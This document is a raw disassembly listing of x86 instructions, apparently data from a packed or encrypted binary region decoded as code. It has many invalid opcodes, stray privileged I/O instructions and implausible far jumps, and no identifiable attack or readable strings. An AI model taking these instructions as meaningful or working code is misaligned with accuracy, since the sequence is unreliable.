  4164a3:	iret   
  4164a4:	push   edi
  4164a5:	mov    ds:0x99270346,al
  4164aa:	(bad)  
  4164ab:	lds    eax,FWORD PTR [edi+eax*4+0x14b53e24]
  4164b2:	xchg   DWORD PTR [ebp+0x730396e1],ebx
  4164b8:	mov    ds:0xb603bef4,eax
  4164bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164be:	pop    ebp
  4164bf:	pusha  
  4164c0:	retf   
  4164c1:	std    
  4164c2:	dec    esp
  4164c3:	dec    esp
  4164c4:	call   0xddd3f167
  4164c9:	fcmove st,st(0)
  4164cb:	fadd   QWORD PTR [ebx-0x2e355ab6]
  4164d1:	stos   BYTE PTR es:[edi],al
  4164d2:	rcr    DWORD PTR [ecx+0x20],cl
  4164d5:	fsubr  QWORD PTR [edx]
  4164d7:	jmp    0x4164ee
  4164d9:	mul    BYTE PTR [edx-0x6db11e24]
  4164df:	pop    edx
  4164e0:	pop    eax
  4164e1:	(bad)  
  4164e2:	leave  
  4164e3:	test   eax,0x30d35dad
  4164e8:	cmc    
  4164e9:	fisttp QWORD PTR [edi-0x60bbe03b]
  4164ef:	mov    DWORD PTR [edi+0x11],ebp
  4164f2:	push   eax
  4164f3:	pop    ebp
  4164f4:	mov    bl,0xd2
  4164f6:	xchg   ebp,eax
  4164f7:	jbe    0x4164cd
  4164f9:	adc    al,0x1f
  4164fb:	cmp    dh,BYTE PTR [ebx-0x175c2de2]
  416501:	cmp    bl,BYTE PTR [edx+0x3c851f84]
  416507:	push   cs
  416508:	mov    dl,0x9a
  41650a:	xor    eax,0x6c61dd3b
  41650f:	into   
  416510:	neg    DWORD PTR [esi-0x509abcce]
  416516:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416517:	dec    ebp
  416518:	xchg   edx,eax
  416519:	sbb    cl,BYTE PTR ds:0x89e78e1a
  41651f:	sbb    dh,BYTE PTR [esp+ebx*8-0x30]
  416523:	nop
  416524:	jl     0x4164da
  416526:	loop   0x4164bf
  416528:	sub    ebx,edx
  41652a:	outs   dx,BYTE PTR ds:[esi]
  41652b:	mov    edx,0xb2c9cdfa
  416530:	adc    ecx,ecx
  416532:	push   ebx
  416533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416534:	ds ja  0x416518
  416537:	fcom   QWORD PTR [edx+0x4b592006]
  41653d:	inc    BYTE PTR [eax+0x19]
  416540:	sbb    dl,ch
  416542:	inc    eax
  416543:	lahf   
  416544:	mov    dl,0x1a
  416546:	sti    
  416547:	sub    esp,edx
  416549:	mov    esp,edi
  41654b:	pop    edx
  41654c:	jmp    0x9b16350c
  416551:	je     0x4164fb
  416553:	xchg   esi,eax
  416554:	add    al,0xd8
  416556:	add    ch,BYTE PTR [edi+ebp*1]
  416559:	jae    0x41655b
  41655b:	mov    dl,0x8e
  41655d:	bound  ecx,QWORD PTR [edi]
  41655f:	push   0xc417a50d
  416564:	out    dx,al
  416565:	pop    ebp
  416566:	sub    al,0x78
  416568:	push   ds
  416569:	mov    BYTE PTR [edx+ebp*1+0x1b],dh
  41656d:	jns    0x416559
  41656f:	pop    esi
  416570:	stos   DWORD PTR es:[edi],eax
  416571:	or     bl,dh
  416573:	cs pop ecx
  416575:	fidivr WORD PTR [esi]
  416577:	sbb    al,0x1d
  416579:	cld    
  41657a:	fstp   DWORD PTR [ebx]
  41657c:	pop    DWORD PTR [esi+0x28a83387]
  416582:	hlt    
  416583:	push   esi
  416584:	sub    eax,0x8bb3933a
  416589:	adc    al,0x7
  41658b:	dec    eax
  41658c:	add    al,0x95
  41658f:	pop    ebx
	...
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x59b04354]
  416601:	xchg   edi,eax
  416602:	popf   
  416603:	and    eax,0xec44
  416608:	add    al,0x1
  41660a:	add    BYTE PTR [eax],al
  41660c:	loope  0x41667a
  41660e:	sub    ch,al
  416610:	mov    ebp,DWORD PTR [esi]
  416612:	in     eax,dx
  416613:	and    DWORD PTR [edx],ecx
  416615:	xchg   ecx,eax
  416616:	fild   QWORD PTR [esi-0x1f]
  416619:	stos   DWORD PTR es:[edi],eax
  41661a:	in     eax,dx
  41661b:	in     eax,dx
  41661c:	into   
  41661d:	fimul  WORD PTR ds:0x3bd53930
  416623:	xor    ecx,ebx
  416625:	dec    ebp
  416626:	jne    0x4165d2
  416628:	leave  
  416629:	rcr    BYTE PTR [ebp+0x7a6e4251],1
  41662f:	jb     0x416632
  416631:	push   esp
  416632:	inc    ebp
  416633:	dec    ebx
  416634:	shl    ebx,0xa7
  416637:	jns    0x4165da
  416639:	push   edi
  41663a:	ja     0x4165f5
  41663c:	mov    BYTE PTR ds:0x5146feff,bh
  416642:	pop    ss
  416643:	cmp    edi,DWORD PTR [edi+eax*4]
  416646:	shl    DWORD PTR [ebx+0x41617438],0xac
  41664d:	imul   ebp,DWORD PTR [ebp+0x5b],0xee892e42
  416654:	dec    esi
  416655:	aad    0xf1
  416657:	stos   DWORD PTR es:[edi],eax
  416658:	repnz ins BYTE PTR es:[edi],dx
  41665a:	pop    ebp
  41665b:	in     al,0xdc
  41665d:	leave  
  41665e:	outs   dx,BYTE PTR ds:[esi]
  41665f:	adc    DWORD PTR [ecx-0xb],eax
  416662:	dec    esi
  416663:	stos   DWORD PTR es:[edi],eax
  416664:	shr    DWORD PTR [edx+esi*2+0x44],0x95
  416669:	adc    al,0xd
  41666b:	stc    
  41666c:	adc    BYTE PTR [ebx],0x8c
  41666f:	mov    es,WORD PTR [eax+eax*1+0x475daa9d]
  416676:	and    ecx,esi
  416678:	xchg   esp,eax
  416679:	loope  0x41662e
  41667b:	inc    edi
  41667c:	dec    edi
  41667d:	xor    al,0xb0
  41667f:	or     ecx,esi
  416681:	int3   
  416682:	mov    ds:0xfe40cf9a,al
  416688:	std    
  416689:	stos   DWORD PTR es:[edi],eax
  41668a:	and    DWORD PTR [edx],eax
  41668c:	call   0x5df5:0xef02b7bd
  416693:	repz out dx,al
  416695:	mov    bh,bl
  416697:	nop
  416698:	mov    dh,0xa4
  41669a:	sbb    bl,BYTE PTR [eax+0x2fd8e71f]
  4166a0:	xor    DWORD PTR [edi-0x69],ebx
  4166a3:	(bad)  
  4166a4:	jmp    0x4166ed
  4166a6:	or     DWORD PTR [esi-0x14],0x63dd6b48
  4166ad:	(bad)
  4166b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166b2:	ja     0x416655
  4166b4:	iret   
  4166b5:	cs sub al,0x71
  4166b8:	jb     0x4166d2
  4166ba:	and    ecx,DWORD PTR [ecx+0x29]
  4166bd:	adc    BYTE PTR [eax-0x12],ah
  4166c0:	pop    eax
  4166c1:	popa   
  4166c2:	leave  
  4166c3:	adc    eax,DWORD PTR [eax+ebx*8]
  4166c6:	cli    
  4166c7:	inc    ah
  4166c9:	or     ebp,DWORD PTR [eax-0x43]
  4166cc:	faddp  st(5),st
  4166ce:	jne    0x416737
  4166d0:	retf   
  4166d1:	sub    BYTE PTR [edx+ebx*4-0x21],cl
  4166d5:	xchg   edi,eax
  4166d6:	outs   dx,BYTE PTR ds:[esi]
  4166d7:	dec    ebp
  4166d8:	jae    0x416693
  4166da:	push   edi
  4166db:	push   ebx
  4166dc:	jne    0x4166f9
  4166de:	sbb    esp,DWORD PTR [eax+0x27d7c78a]
  4166e4:	cmp    dl,BYTE PTR [ecx+0x3ad96fbe]
  4166ea:	pop    ss
  4166eb:	or     dh,ah
  4166ed:	add    DWORD PTR [ebx+0x71],esp
  4166f0:	jp     0x416688
  4166f2:	and    edi,DWORD PTR [ecx]
  4166f4:	fisttp WORD PTR cs:[ebx+eiz*8-0xe]
  4166f9:	xchg   ebx,eax
  4166fa:	sar    BYTE PTR [eax-0x31],cl
  4166fd:	pop    eax
  4166fe:	fisttp QWORD PTR [ebp+0x77d9b3c4]
  416704:	pop    esp
  416705:	not    BYTE PTR [edi]
  416707:	(bad)  
  416708:	shr    DWORD PTR [ebx+0x2ad307ee],cl
  41670e:	hlt    
  41670f:	iret   
	...
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	cld    
  416781:	sbb    DWORD PTR [esi],edx
  416783:	xor    BYTE PTR [eax-0x13],cl
  416786:	add    BYTE PTR [eax],al
  416788:	add    al,0x1
  41678a:	add    BYTE PTR [eax],al
  41678c:	jns    0x41678f
  41678e:	ucomiss xmm7,xmm5
  416791:	fdivr  QWORD PTR [edx]
  416793:	and    bl,BYTE PTR [ebx-0x32]
  416796:	test   BYTE PTR [ecx],ah
  416798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416799:	stc    
  41679a:	pop    esi
  41679b:	pop    esp
  41679c:	call   0x3c67d804
  4167a1:	jge    0x4167b1
  4167a3:	xor    DWORD PTR [esp+edi*1],esp
  4167a6:	xlat   BYTE PTR ds:[ebx]
  4167a7:	jno    0x41677a
  4167a9:	dec    ebp
  4167aa:	jnp    0x4167fa
  4167ac:	and    dh,dl
  4167ae:	push   ds
  4167af:	xchg   ebx,eax
  4167b0:	mov    DWORD PTR [ebx+0xf],ecx
  4167b3:	sub    ah,BYTE PTR [edi]
  4167b5:	xor    BYTE PTR [ecx-0x2a],ch
  4167b8:	mov    edi,0xde9df47e
  4167bd:	adc    DWORD PTR [ebp+0xe],edx
  4167c0:	jbe    0x416763
  4167c2:	adc    ecx,DWORD PTR [eax-0x78]
  4167c5:	loopne 0x416819
  4167c7:	xlat   BYTE PTR ds:[ebx]
  4167c8:	pop    edx
  4167c9:	jns    0x416806
  4167cb:	stc    
  4167cc:	pop    ds
  4167cd:	ds xor eax,0xe2be454d
  4167d3:	arpl   cx,dx
  4167d5:	call   0xdecf701d
  4167da:	mov    ebp,DWORD PTR [edx+0x3c]
  4167dd:	inc    edi
  4167de:	ret    0x3c30
  4167e1:	cli    
  4167e2:	test   eax,0x464f7a94
  4167e7:	sti    
  4167e8:	nop
  4167e9:	xchg   esp,eax
  4167ea:	sbb    DWORD PTR [esi-0x757e681c],ebx
  4167f0:	dec    ebp
  4167f1:	xchg   ecx,eax
  4167f2:	push   0xbdb95352
  4167f7:	adc    edi,ebx
  4167f9:	js     0x416871
  4167fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167fc:	repz (bad) 
  4167ff:	push   ebx
  416800:	add    esp,DWORD PTR [esi-0x3f]
  416803:	jg     0x416863
  416805:	test   BYTE PTR [edi],al
  416807:	xchg   ebx,eax
  416808:	ds push edi
  41680a:	jle    0x41685e
  41680c:	je     0x4167ca
  41680e:	lods   eax,DWORD PTR ds:[esi]
  41680f:	(bad)  
  416810:	pushf  
  416811:	loope  0x416891
  416813:	inc    ecx
  416814:	xor    al,0xb1
  416816:	shl    DWORD PTR [eax+0x16],cl
  416819:	jmp    0x7916:0xb67028a
  416820:	hlt    
  416821:	sub    ecx,esi
  416823:	lds    esp,FWORD PTR [eax+0x5f]
  416826:	inc    eax
  416827:	dec    esi
  416828:	rcr    DWORD PTR [ebp+0x45138535],1
  41682e:	outs   dx,DWORD PTR ds:[esi]
  41682f:	les    ebp,FWORD PTR [edx+0x81dd7a]
  416835:	push   edi
  416836:	xchg   edi,eax
  416837:	adc    dh,BYTE PTR [edi-0x4a]
  41683a:	hlt    
  41683b:	adc    eax,0xeb923dc2
  416840:	push   edx
  416841:	out    0xe1,al
  416843:	(bad)  [ebp-0x27fb8ba5]
  416849:	std    
  41684a:	jnp    0x41680b
  41684c:	mov    al,0xca
  41684e:	xchg   ebx,eax
  41684f:	xor    al,0x77
  416851:	inc    esi
  416852:	out    0xeb,eax
  416854:	ret    
  416855:	and    edx,DWORD PTR [ebp-0x8]
  416858:	out    0x65,al
  41685a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41685b:	bound  eax,QWORD PTR [edx]
  41685d:	cli    
  41685e:	sub    al,0x75
  416860:	dec    ecx
  416861:	jnp    0x4168d9
  416863:	mov    bh,0x33
  416865:	sub    DWORD PTR [edi-0x11773588],ebp
  41686b:	pop    edi
  41686c:	sub    BYTE PTR ds:0x94dc4496,ah
  416872:	psubb  mm4,QWORD PTR [edx+eax*1]
  416876:	sub    al,0x3b
  416878:	iret   
  416879:	rcr    DWORD PTR [esi-0x6f7f8d67],1
  41687f:	loopne 0x416819
  416881:	jp     0x416827
  416883:	dec    eax
  416884:	or     BYTE PTR [ebx+0x54],dh
  416887:	ins    BYTE PTR es:[edi],dx
  416888:	gs push ecx
  41688a:	sub    eax,0x5e0701a2
  41688f:	xor    eax,0x0
	...
  4168f4:	shr    DWORD PTR [edi-0x4810cfa],1
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x6dd8139c
  416904:	dec    esp
  416905:	out    dx,al
  416906:	add    BYTE PTR [eax],al
  416908:	add    al,0x1
  41690a:	add    BYTE PTR [eax],al
  41690c:	gs push ecx
  41690e:	retf   0x7338
  416911:	outs   dx,DWORD PTR ds:[esi]
  416912:	dec    ebx
  416913:	scas   eax,DWORD PTR es:[edi]
  416914:	lock sbb eax,esi
  416917:	into   
  416918:	ret    
  416919:	mov    edx,0xad137509
  41691e:	outs   dx,DWORD PTR ds:[esi]
  41691f:	dec    esi
  416920:	pop    esp
  416921:	xchg   edx,eax
  416922:	sbb    BYTE PTR [edi-0x63],bl
  416925:	jno    0x416936
  416927:	pop    ebx
  416928:	lahf   
  416929:	gs jmp 0x4168bc
  41692c:	mov    bl,0x7e
  41692e:	mov    ch,0x66
  416930:	or     al,0xd9
  416932:	sub    eax,0x43b1dc75
  416937:	rol    BYTE PTR [esi+0x31],1
  41693a:	or     BYTE PTR [edx+edx*4-0x78],ch
  41693e:	and    eax,0xdd6e00f7
  416943:	and    cl,BYTE PTR [ebp+0x52]
  416946:	(bad)  
  416948:	les    eax,FWORD PTR [ebx-0x5]
  41694b:	cmp    BYTE PTR [edx],dl
  41694d:	mov    bh,0x38
  41694f:	push   ds
  416950:	xchg   edi,eax
  416951:	mov    ebx,0x35ce7de7
  416956:	sbb    DWORD PTR [esi-0x7dc1565f],edi
  41695c:	out    dx,al
  41695d:	or     esp,edx
  41695f:	lock mov esi,0xa5ce4bfd
  416965:	cld    
  416966:	sub    ebp,esp
  416968:	jo     0x4169b6
  41696a:	fsubrp st(3),st
  41696c:	scas   al,BYTE PTR es:[edi]
  41696d:	fiadd  DWORD PTR [esi+0x791dcc9]
  416973:	js     0x4169c5
  416975:	push   esi
  416976:	mov    esi,0xf55c3735
  41697b:	dec    esi
  41697c:	bnd ja 0x4169fe
  41697f:	adc    ebp,esi
  416981:	rcr    BYTE PTR [ecx-0x3f],cl
  416984:	adc    DWORD PTR [ecx],0xe975115c
  41698a:	sub    al,0x23
  41698c:	xchg   ebx,eax
  41698d:	scas   al,BYTE PTR es:[edi]
  41698e:	in     al,0xc3
  416990:	or     edi,DWORD PTR [eax]
  416992:	pextrw ebx,mm2,0xf8
  416996:	ffreep st(1)
  416998:	sbb    bl,BYTE PTR [eax-0x6d]
  41699b:	jae    0x416931
  41699d:	sub    dl,dl
  41699f:	mov    ah,0x86
  4169a1:	pop    esi
  4169a2:	clc    
  4169a3:	mov    esi,0x4d7c0f9
  4169a8:	ja     0x41694b
  4169aa:	test   BYTE PTR [eax],dl
  4169ac:	fs es dec ecx
  4169af:	and    eax,0x216afd37
  4169b4:	cmp    DWORD PTR [ebp-0x6a08d538],edx
  4169ba:	cmp    BYTE PTR [ebp-0x6a10230f],cl
  4169c0:	jg     0x4169be
  4169c2:	ins    DWORD PTR es:[edi],dx
  4169c3:	add    DWORD PTR [edi+0x59],edi
  4169c6:	push   edx
  4169c7:	jnp    0x4169b8
  4169c9:	pop    ds
  4169ca:	push   ecx
  4169cb:	add    ch,BYTE PTR [ebx+0xb]
  4169ce:	repnz sbb BYTE PTR ds:0x525911f8,0xb9
  4169d6:	psraw  mm0,QWORD PTR [edx+0x2633b994]
  4169dd:	mov    dl,ch
  4169df:	fcomp  QWORD PTR [ecx+0x450b9d88]
  4169e5:	cmp    eax,edi
  4169e7:	sbb    eax,0x588d5cd1
  4169ec:	add    ebp,ebx
  4169ee:	mov    dh,0x57
  4169f0:	fcomp  DWORD PTR [eax-0x1e]
  4169f3:	call   0x9d3f:0x563fe914
  4169fa:	nop
  4169fb:	adc    eax,0x62d017cb
  416a00:	in     eax,0x25
  416a02:	fdivp  st(2),st
  416a04:	fst    DWORD PTR [edx+0x9b7f3b8]
  416a0a:	mov    cl,0x69
  416a0c:	sbb    al,0x7c
  416a0e:	(bad)  
  416a0f:	ja     0x416a11
	...
  416a71:	add    BYTE PTR [eax],al
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x70f60ba3
  416a82:	mov    ecx,ebp
  416a84:	push   eax
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    al,0x1
  416a8a:	add    BYTE PTR [eax],al
  416a8c:	into   
  416a8d:	inc    esp
  416a8e:	pop    ds
  416a8f:	mov    ah,0xba
  416a91:	inc    esp
  416a92:	mov    ds:0x40f30978,eax
  416a97:	cmc    
  416a98:	jbe    0x416ad3
  416a9a:	mov    ds:0x4402841b,al
  416a9f:	and    ecx,0xec4c09c6
  416aa5:	push   0x55
  416aa7:	jmp    0x416a43
  416aa9:	test   BYTE PTR [esi+0x7d],cl
  416aac:	cmp    DWORD PTR [eax+0x6e662999],esp
  416ab2:	inc    esi
  416ab3:	mov    ds:0xc8bafbac,eax
  416ab8:	adc    eax,0x878672ca
  416abd:	outs   dx,BYTE PTR ds:[esi]
  416abe:	out    dx,eax
  416abf:	mov    ebx,0x4d74e68e
  416ac4:	mov    ebp,DWORD PTR [ecx+esi*4-0x4d]
  416ac8:	lock adc bl,BYTE PTR [ecx]
  416acb:	dec    eax
  416acc:	cld    
  416acd:	cmp    ecx,DWORD PTR [esi+ecx*8+0x10]
  416ad1:	mov    edi,0xc6869eb2
  416ad6:	mov    ecx,0xf2689d8b
  416adb:	pop    ds
  416adc:	out    dx,eax
  416add:	sbb    al,0x51
  416adf:	addr16 jmp 0x416b1f
  416ae2:	mov    db6,esi
  416ae5:	iret   
  416ae6:	rol    DWORD PTR [edi+0x3f],0x55
  416aea:	jp     0x416b23
  416aec:	inc    edi
  416aed:	push   edx
  416aee:	mov    ah,0x47
  416af0:	jecxz  0x416ac7
  416af2:	std    
  416af3:	retf   
  416af4:	and    eax,0x50f1525
  416af9:	lods   eax,DWORD PTR ds:[esi]
  416afa:	test   eax,0xcb620a2d
  416aff:	xor    eax,0xd3ba2527
  416b04:	sbb    DWORD PTR [esi+ebp*1-0x17ec61ad],esp
  416b0b:	out    dx,al
  416b0c:	push   0xffffffc3
  416b0e:	push   ss
  416b0f:	dec    ebp
  416b10:	outs   dx,DWORD PTR ds:[esi]
  416b11:	mov    al,0xbd
  416b13:	cmp    al,0x13
  416b15:	idiv   ebx
  416b17:	adc    al,0x85
  416b19:	and    ebx,edx
  416b1b:	inc    BYTE PTR [ebx]
  416b1d:	nop
  416b1e:	rcr    ah,1
  416b20:	gs loop 0x416b6d
  416b23:	inc    eax
  416b24:	(bad)  
  416b25:	push   esp
  416b26:	or     eax,ecx
  416b28:	test   DWORD PTR [ebx+ebx*1-0x4d],eax
  416b2c:	or     edx,0x3c
  416b2f:	jle    0x416b59
  416b31:	ds pop ds
  416b33:	jbe    0x416b36
  416b35:	jae    0x416b74
  416b37:	xor    eax,0xaf9bb90
  416b3c:	xchg   ebx,eax
  416b3d:	(bad)  
  416b3e:	fs jnp 0x416b8c
  416b41:	xchg   ebx,eax
  416b42:	sahf   
  416b43:	add    esp,DWORD PTR [ebx-0x60873103]
  416b49:	jle    0x416b7f
  416b4b:	cmp    ebx,DWORD PTR ds:0x93d608aa
  416b51:	xchg   esi,eax
  416b52:	or     eax,0xd34552c6
  416b57:	sti    
  416b58:	pop    ss
  416b59:	popa   
  416b5a:	pop    ebp
  416b5b:	xchg   edi,eax
  416b5c:	aas    
  416b5d:	mov    esi,0x5ea40ec2
  416b62:	cmp    bh,al
  416b64:	mov    cl,0x6e
  416b66:	jne    0x416b11
  416b68:	lock dec eax
  416b6a:	imul   esi,DWORD PTR [edi+ebx*2-0x3],0x39
  416b6f:	sbb    ah,BYTE PTR ds:0x164a020c
  416b75:	cli    
  416b76:	jnp    0x416b1a
  416b78:	ja     0x416bf3
  416b7a:	out    0x2f,al
  416b7c:	xchg   BYTE PTR [ebx],dh
  416b7e:	mov    dh,0xa1
  416b80:	mov    bl,0x77
  416b82:	pop    ebp
  416b83:	ins    DWORD PTR es:[edi],dx
  416b84:	mov    ebp,0xfe275269
  416b89:	push   es
  416b8a:	outs   dx,DWORD PTR ds:[esi]
  416b8b:	cmp    eax,DWORD PTR [esi-0x10]
  416b8e:	sub    BYTE PTR [ecx+0x0],0x0
	...
  416bf1:	add    BYTE PTR [eax],al
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x7e5b70a9
  416c01:	sti    
  416c02:	mov    ecx,0xf054ef
  416c07:	add    BYTE PTR [ecx+eax*1],al
  416c0a:	add    BYTE PTR [eax],al
  416c0c:	std    
  416c0d:	stos   DWORD PTR es:[edi],eax
  416c0e:	lods   al,BYTE PTR ds:[esi]
  416c0f:	mov    BYTE PTR [ecx],0x35
  416c12:	jbe    0x416c44
  416c14:	pop    esi
  416c15:	mov    al,0x32
  416c17:	add    DWORD PTR [eax-0x16f6d6b],0x6c2188f2
  416c21:	fnstsw WORD PTR [esi+0x78ae7a15]
  416c27:	aad    0xc8
  416c29:	inc    esi
  416c2a:	and    BYTE PTR [ebp+edi*8+0x6eddcea],dh
  416c31:	sbb    DWORD PTR [ecx-0x7d],edi
  416c34:	and    BYTE PTR cs:[edi],0xbb
  416c38:	xlat   BYTE PTR ds:[ebx]
  416c39:	shr    BYTE PTR [esi],0xe0
  416c3c:	mov    BYTE PTR [edx-0x71de1cf3],ch
  416c42:	mov    ecx,0x2ff0a180
  416c47:	pop    ecx
  416c48:	mov    al,0x9c
  416c4a:	out    0x2,al
  416c4c:	into   
  416c4d:	(bad)
  416c50:	jns    0x416c2b
  416c52:	icebp  
  416c53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c54:	cld    
  416c55:	xchg   edx,eax
  416c56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c57:	xchg   edi,eax
  416c58:	arpl   WORD PTR [edi-0x452d2704],sp
  416c5e:	jmp    0xa93d7597
  416c63:	inc    edx
  416c64:	int    0xdd
  416c66:	rcr    DWORD PTR [edx],0xbb
  416c69:	adc    eax,0x3644269f
  416c6e:	shl    BYTE PTR [edi+0x23],0x77
  416c72:	sbb    DWORD PTR ds:0x6164297e,ebx
  416c78:	add    bl,BYTE PTR [edi-0x8e1493]
  416c7e:	sbb    eax,0xe3e4cff6
  416c83:	adc    DWORD PTR [ebx+ebp*2+0x1f],edx
  416c87:	push   eax
  416c88:	hlt    
  416c89:	xchg   ecx,eax
  416c8a:	call   0xdd539458
  416c8f:	aas    
  416c90:	cwde   
  416c91:	iret   
  416c92:	enter  0x85dc,0x95
  416c96:	outs   dx,BYTE PTR ds:[esi]
  416c97:	jg     0x416c6c
  416c99:	(bad)  
  416c9a:	dec    DWORD PTR [eax+0x465ab15f]
  416ca0:	pushf  
  416ca1:	dec    esi
  416ca2:	in     al,dx
  416ca3:	rcl    DWORD PTR [ecx+0x4f2b39bf],1
  416ca9:	mov    bh,0x6c
  416cab:	mov    ebx,0xc5a32a1f
  416cb0:	mov    dl,BYTE PTR [eax]
  416cb2:	in     eax,0x51
  416cb4:	shl    DWORD PTR [ecx+ecx*4],cl
  416cb7:	and    DWORD PTR [ecx+ecx*1-0x35],esi
  416cbb:	ret    0xd106
  416cbe:	xchg   esp,eax
  416cbf:	mov    ch,cl
  416cc1:	rcl    cl,1
  416cc3:	or     DWORD PTR [ebx-0x18],esi
  416cc6:	loopne 0x416c90
  416cc8:	and    ebp,DWORD PTR [ebx+0x7a]
  416ccb:	xchg   dh,bl
  416ccd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cce:	inc    ebx
  416ccf:	add    cl,al
  416cd1:	call   0xe2bfebad
  416cd6:	mov    esp,0x9bbc7f2c
  416cdb:	lea    ecx,[ebp+0x4746c438]
  416ce1:	and    eax,0x907aa418
  416ce6:	lahf   
  416ce7:	shr    al,0xd8
  416cea:	sbb    dh,cl
  416cec:	imul   ecx,DWORD PTR [esi+0x3606ccb4],0xfffffff2
  416cf3:	pop    edx
  416cf4:	in     eax,dx
  416cf5:	hlt    
  416cf6:	and    al,0x28
  416cf8:	push   ds
  416cf9:	mov    ebp,0x80505026
  416cfe:	xor    DWORD PTR [ebp+0x1a171f44],0xd
  416d05:	mov    DWORD PTR [ebx*8-0x69ba32f],esi
  416d0c:	xchg   ebx,eax
  416d0d:	out    0xba,al
  416d0f:	add    DWORD PTR [eax],0x0
	...
  416d72:	add    BYTE PTR [eax],al
  416d74:	and    DWORD PTR [ebx-0x40445077],edx
  416d7a:	daa    
  416d7b:	lahf   
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	popa   
  416d81:	add    BYTE PTR [esi-0x50],al
  416d84:	pop    eax
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    al,0x1
  416d8a:	add    BYTE PTR [eax],al
  416d8c:	mov    ebp,0x4fa88993
  416d91:	push   esp
  416d92:	dec    ebx
  416d93:	dec    ecx
  416d94:	outs   dx,DWORD PTR ds:[esi]
  416d95:	jle    0x416dc5
  416d97:	push   edi
  416d98:	fnsave [ebx-0x30dc0d2]
  416d9e:	stos   DWORD PTR es:[edi],eax
  416d9f:	popf   
  416da0:	gs xchg ch,ah
  416da3:	jecxz  0x416db8
  416da5:	pop    ss
  416da6:	test   DWORD PTR [esi-0x289c9c17],esp
  416dac:	push   ebx
  416dad:	imul   esi,DWORD PTR [ecx+0x6d],0xa
  416db1:	mov    dh,0x26
  416db3:	iret   
  416db4:	loope  0x416dd8
  416db6:	add    ebp,esp
  416db8:	lea    esi,[ebx-0x6092b460]
  416dbe:	aam    0xda
  416dc0:	mov    esp,0x47fff8f8
  416dc5:	pop    ss
  416dc6:	js     0x416db3
  416dc8:	mov    dl,0x41
  416dca:	test   ah,ah
  416dcc:	inc    esp
  416dcd:	mov    eax,0xfd3d2db4
  416dd2:	cmovbe ebp,DWORD PTR ds:[ecx+0x34a9a33a]
  416dda:	xchg   edi,eax
  416ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ddc:	and    edx,DWORD PTR [edi-0x4b]
  416ddf:	jmp    0xa3e9:0x3f843e44
  416de6:	outs   dx,BYTE PTR ds:[esi]
  416de7:	fild   DWORD PTR [ebx+0x21]
  416dea:	and    BYTE PTR [ebx],al
  416dec:	call   0x1987:0xe6726f3c
  416df3:	out    dx,eax
  416df4:	pop    eax
  416df5:	iret   
  416df6:	setl   ah
  416df9:	or     bh,BYTE PTR [edx+0x35]
  416dfc:	out    0x4d,eax
  416dfe:	xchg   BYTE PTR fs:[esi-0x14],bl
  416e02:	mov    esi,0xeab60ec1
  416e07:	ss add al,0xe6
  416e0a:	xchg   DWORD PTR [eax-0x3],esp
  416e0d:	pop    ds
  416e0e:	mov    ebx,DWORD PTR [esi-0x425c9da5]
  416e14:	call   0xc505410a
  416e19:	mov    ecx,0x204426e2
  416e1e:	in     al,dx
  416e1f:	loope  0x416e5c
  416e21:	out    dx,eax
  416e22:	out    dx,al
  416e23:	bound  eax,QWORD PTR [edi]
  416e25:	jae    0x416e32
  416e27:	xchg   dx,ax
  416e29:	mov    DWORD PTR [edi+eax*2-0x7e],ecx
  416e2d:	cmp    dl,ch
  416e2f:	mov    cs,WORD PTR [edx-0x205e5ee4]
  416e35:	ror    DWORD PTR [ebp+0x7],cl
  416e38:	addr16 (bad) 
  416e3a:	mov    bl,0xc2
  416e3c:	fwait
  416e3d:	adc    eax,0x36690d3
  416e42:	sub    al,0xff
  416e44:	aaa    
  416e45:	jmp    0x416e71
  416e47:	adc    bl,bl
  416e49:	pop    edi
  416e4a:	pop    esi
  416e4b:	out    0xd6,eax
  416e4d:	cmp    BYTE PTR [ebx+0x7d53fdbd],dl
  416e53:	ret    0xb22e
  416e56:	pusha  
  416e57:	(bad)  
  416e59:	adc    ah,cl
  416e5b:	scas   eax,DWORD PTR es:[edi]
  416e5c:	in     eax,0xa5
  416e5e:	ficomp WORD PTR [ebp+0x10]
  416e61:	cmp    al,0x19
  416e63:	test   eax,0x8dd83652
  416e68:	push   esi
  416e69:	aas    
  416e6a:	jp     0x416e39
  416e6c:	cwde   
  416e6d:	jb     0x416e2d
  416e6f:	cwde   
  416e70:	pop    edi
  416e71:	aad    0x61
  416e73:	push   ss
  416e74:	mov    ebx,DWORD PTR [ecx]
  416e76:	push   esi
  416e77:	push   ss
  416e78:	les    edi,FWORD PTR [edi]
  416e7a:	xchg   BYTE PTR [esp+ecx*4-0x2f],ch
  416e7e:	(bad)  
  416e7f:	ja     0x416e62
  416e81:	retf   
  416e82:	push   ebx
  416e83:	adc    ah,BYTE PTR [edx+0x6a]
  416e86:	sbb    eax,0x2b9ed32
  416e8b:	pop    ds
  416e8c:	and    BYTE PTR [ebx],bh
  416e8e:	jg     0x416e70
